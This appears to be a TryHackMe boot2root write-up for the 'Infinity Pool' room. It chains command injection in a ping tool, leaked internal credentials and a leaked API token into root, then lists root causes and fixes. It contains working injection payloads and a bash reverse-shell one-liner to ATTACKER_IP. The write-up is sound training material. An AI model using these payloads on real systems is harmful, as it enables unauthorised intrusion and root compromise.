# TryHackMe — Hacker Holidays: The Byte Lotus Hotel
## Infinity Pool | Boot2Root | Medium | 90 pts

**Target:** `10.112.176.129` (lab IP, rotated during engagement)
**Category:** Boot2Root
**Objectives:** User flag, Root flag

---

## Summary

Infinity Pool chains a classic OS command injection on a public-facing "network diagnostic" tool into a multi-hop internal service pivot: leaked credentials from one internal microservice unlock a FreePBX admin panel, which in turn leaks a Bearer token for a second internal service — a root-owned automation API that is itself vulnerable to command injection. The result is a full `web` → `root` escalation without needing any password cracking, SUID abuse, or kernel exploits.

---

## 1. Recon

Initial port scan:

```bash
nmap -p- -T4 --min-rate=1000 10.114.137.1
```

Only two ports open:

| Port | Service |
|------|---------|
| 22   | OpenSSH 9.6p1 (Ubuntu) |
| 80   | Gunicorn (HTTP) |

A follow-up `-sC -sV` scan pulled `robots.txt`, which disclosed two disallowed-but-unauthenticated paths:

```
Disallow: /internal/
Disallow: /status
```

## 2. Foothold — Command Injection in `/internal/netcheck`

`/internal/` served a staff "Sister-property connectivity" tool — a form that POSTs a `host` value to `/internal/netcheck` and pings it, returning the raw output.

Testing with a chained command confirmed the input was passed unsanitized into a shell:

```bash
curl -s -X POST http://TARGET/internal/netcheck -d "host=127.0.0.1 | id"
```

Response included:

```
uid=1001(web) gid=1001(web) groups=1001(web)
```

Root cause, later confirmed by reading the Flask source (`app.py`):

```python
proc = subprocess.run(
    f"ping -c 1 {host}",
    shell=True,
    capture_output=True,
    text=True,
    timeout=15,
)
```

No sanitization, `shell=True`, direct string interpolation — textbook command injection.

### Reverse shell

```bash
# listener
nc -lvnp 4444

# trigger
curl -s -X POST http://TARGET/internal/netcheck \
  --data-urlencode "host=127.0.0.1 | bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"
```

Shell stabilized with:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z, then on attacker: stty raw -echo; fg
```

### User flag

```bash
find / -name "user.txt" 2>/dev/null
cat /home/web/user.txt
```

**User flag:** `THM{n0_v1s1bl3_3dg3}`

---

## 3. Privilege Escalation — Internal Service Pivot Chain

### 3.1 Mapping the architecture

`ps aux` and `systemctl status` revealed three sibling Flask/Gunicorn services under `/var/www/infinity_pool/`, each running as a different user:

| Service | Dir | Bind | Runs as |
|---|---|---|---|
| `edge` | `/var/www/infinity_pool/edge` | `0.0.0.0:80` | `web` |
| `watchtower` | `/var/www/infinity_pool/watchtower` | `127.0.0.1:3000` | `svc-watch` |
| `automation` | `/var/www/infinity_pool/automation` | `127.0.0.1:9000` | **root** |

`automation` running as root, loopback-only, was the clear target — but it wasn't directly readable or reachable except from localhost, and `web` had no read access to its directory.

### 3.2 Leaking creds from `watchtower`

`watchtower` exposed an unauthenticated ops dashboard on `127.0.0.1:3000`, which advertised two endpoints:

```bash
curl -s http://127.0.0.1:3000/api/config
```

```json
{
  "automation_endpoint": "http://127.0.0.1:9000",
  "note": "internal network only -- do not expose",
  "ops_note": "UCP still on default template creds (FreePBXUCPTemplateCreator) -- ROTATE.",
  "telephony_pass": "St4yN0t1c3d_2026",
  "telephony_portal": "http://127.0.0.1:8080/ucp",
  "telephony_user": "FreePBXUCPTemplateCreator"
}
```

This leaked live FreePBX UCP credentials (confirmed to be default/unrotated by the `ops_note`), plus explicit confirmation that `automation` was the next target.

### 3.3 Finding the automation key via FreePBX UCP

`automation`'s own `/health` endpoint (also loopback-only) documented its API contract:

```bash
curl -s http://127.0.0.1:9000/health
```

```json
{
  "endpoints": {
    "GET /health": "service status",
    "POST /jobs/export": {
      "auth": "Authorization: Bearer <automation key>",
      "body": {"report": "<report name>"},
      "desc": "archive the latest data export"
    }
  },
  "runs_as": "root",
  "service": "automation",
  "status": "ok"
}
```

A Bearer token was required. To reach the UCP portal (also loopback-only, port 8080), an SSH key was dropped into `web`'s `authorized_keys` from the attacker box, then a local port forward established:

```bash
ssh -L 8080:127.0.0.1:8080 web@TARGET
```

Logging into `http://127.0.0.1:8080/ucp/` with the leaked creds (`FreePBXUCPTemplateCreator` / `St4yN0t1c3d_2026`), creating a dashboard, and adding a **Voicemail widget** leaked the automation Bearer token directly in the widget UI:

```
Automation Key: cc_auto_7b3f9a1c4e0d2f6a
```

### 3.4 Command Injection in `automation` → root

With the key in hand, a legitimate request to `/jobs/export` confirmed the endpoint's behavior:

```bash
curl -sS -X POST http://127.0.0.1:9000/jobs/export \
  -H 'Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a' \
  -H 'Content-Type: application/json' \
  --data-binary '{"report":"test"}'
```

```json
{"command":"tar czf /var/automation/exports/test.tgz /var/automation/data 2>&1", ...}
```

The `report` value was concatenated directly into a shell `tar` command — the same unsanitized pattern as the original foothold. A semicolon-terminated payload confirmed injection and root execution:

```bash
curl -sS -X POST http://127.0.0.1:9000/jobs/export \
  -H 'Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a' \
  -H 'Content-Type: application/json' \
  --data-binary '{"report":"test;whoami;#"}'
```

```json
{"output":"root\ntar: Cowardly refusing to create an empty archive\n..."}
```

### Root flag

```bash
curl -sS -X POST http://127.0.0.1:9000/jobs/export \
  -H 'Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a' \
  -H 'Content-Type: application/json' \
  --data-binary '{"report":"test;cat /root/root.txt;#"}'
```

**Root flag:** `THM{tr4c3d_t0_th3_h0r1z0n}`

---

## 4. Attack Chain Summary

```
Public /internal/netcheck (unauthenticated)
   └─ OS command injection (shell=True, no sanitization)
      └─ Reverse shell as `web`                          → USER FLAG
         └─ Enumerate sibling services (ps aux, systemd)
            └─ watchtower :3000 (svc-watch) — unauth /api/config
               └─ Leaks FreePBX UCP creds (default, unrotated)
                  └─ SSH local port-forward to UCP :8080
                     └─ Voicemail widget leaks automation Bearer key
                        └─ automation :9000 (root) — /jobs/export
                           └─ OS command injection (same pattern)
                              └─ root shell                         → ROOT FLAG
```

## 5. Root Causes & Lessons

- **Repeated anti-pattern:** both the public `edge` service and the internal `automation` service built shell commands via unsanitized string interpolation with `shell=True`. The same class of bug existed at two trust boundaries.
- **Defense in depth failure:** internal, loopback-only services were treated as inherently trusted ("authenticated by network position," per the UCP banner) and therefore skipped input validation and secrets hygiene.
- **Secrets sprawl:** credentials and API keys were scattered across service config endpoints and an admin UI widget rather than a proper secrets manager — a single leaked internal endpoint cascaded into full compromise.
- **Unrotated default credentials:** the `ops_note` literally flagged the FreePBX UCP creds as needing rotation — a real-world reminder that known-bad credentials left "for later" are a common breach vector.

## 6. Remediation

- Never build shell commands via string interpolation; use parameterized subprocess calls (`subprocess.run([...], shell=False)`) with strict input allow-listing (e.g., validate `host` as an IP/hostname regex).
- Don't assume network position (loopback-only) is sufficient authentication — internal services should still authenticate and validate input.
- Store secrets (API keys, service credentials) in a secrets manager, not in admin UI widgets or unauthenticated config endpoints.
- Rotate default/template credentials immediately upon deployment; don't leave "TODO: rotate" notes in production config.
